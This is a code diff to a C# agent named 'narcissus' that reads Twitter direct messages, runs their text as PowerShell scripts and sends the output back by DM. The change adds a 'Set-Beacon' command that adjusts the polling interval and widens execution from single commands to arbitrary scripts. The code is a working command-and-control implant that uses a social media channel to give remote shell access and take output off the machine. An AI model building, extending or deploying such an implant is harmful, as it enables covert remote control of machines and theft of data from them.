@@ -14,6 +14,7 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Web.Script.Serialization;
@@ -238,6 +239,8 @@ namespace narcissus
             DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
             DateTime latestTime = DateTime.Now.ToUniversalTime();
 
+            int beaconTimer = 120;
+
             RunspaceConfiguration nRsConfig = RunspaceConfiguration.Create();
             Runspace narcissusRs = RunspaceFactory.CreateRunspace(nRsConfig);
             narcissusRs.Open();
@@ -260,17 +263,24 @@ namespace narcissus
                             {
                                 narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Acknowledged. Killing narcissus agent.");
                                 return;
+                            }else if (dmEvent.message_create.message_data.text.Split(';')[0] == "Set-Beacon")
+                            {
+                                //Error handle this
+                                beaconTimer = Convert.ToInt32(dmEvent.message_create.message_data.text.Split(';')[1]);
                             }
                             latestTime = epoch.AddMilliseconds(Convert.ToDouble(dmEvent.created_timestamp));
                             Console.WriteLine(latestTime.ToString());
                             Console.WriteLine(dmEvent.message_create.message_data.text);
                             Pipeline nPipeline = narcissusRs.CreatePipeline();
-                            nPipeline.Commands.Add(dmEvent.message_create.message_data.text);
+                            nPipeline.Commands.AddScript(dmEvent.message_create.message_data.text);
+                            nPipeline.Commands.Add("Out-String");
                             try
                             {
+
+                                //error handle system errors and null returns
                                 foreach (PSObject shellResult in nPipeline.Invoke())
                                 {
-                                    shellOut = shellOut + "Name: " + shellResult.Members["Name"].Value + " ";
+                                    shellOut = shellOut + Regex.Replace(shellResult.ToString(), @"\t|\n|\r", "") + " ";
                                 }
                                 narcissusMain.Send_DM(dmEvent.message_create.sender_id, shellOut);
                                 nPipeline.Commands.Clear();
@@ -281,7 +291,7 @@ namespace narcissus
                             nPipeline.Stop();
                         }
                     }
-                    Thread.Sleep(60000);
+                    Thread.Sleep(beaconTimer * 1000);
                 }
                 catch (ThreadAbortException)
                 {
